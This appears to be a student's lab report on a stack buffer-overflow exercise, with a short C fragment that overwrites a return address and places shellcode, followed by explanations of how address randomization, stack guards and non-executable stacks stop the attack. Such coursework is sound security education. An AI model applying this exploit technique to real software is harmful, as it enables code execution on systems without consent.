\section{Task 1}
Code added for exploit\\
\begin{verbatim}
	long buffer_start = 0xbffff174;
	long landing = buffer_start + 250;
	long* ptr = (long*)(buffer + 24);
	*ptr = landing;
	memcpy(buffer + sizeof(buffer) - sizeof(shellcode),
		 shellcode, sizeof(shellcode));
\end{verbatim}

\section{Task 2}
There is segmentation fault when address space randomization is turned on.\\

This is due to the fact that the address used by of the start of the stack is now randomized on each run, and no longer the same as previously found.\\

\section{Task 3}
Error message\\
\begin{verbatim}
*** stack smashing detected ***: ./stack terminated
\end{verbatim}

After the error message there's a backtrace of where the stack buffer overflow started, as well as the memory map of the program at that point in time.\\

This is as the stack guard prevents the stack from being overwritten.\\

\section{Task 4}
No. The program crashes with a segmentation fault.\\

This is as the shell code has been overflowed into the stack, and data in the stack is not allowed to be executed, hence the segfault\\
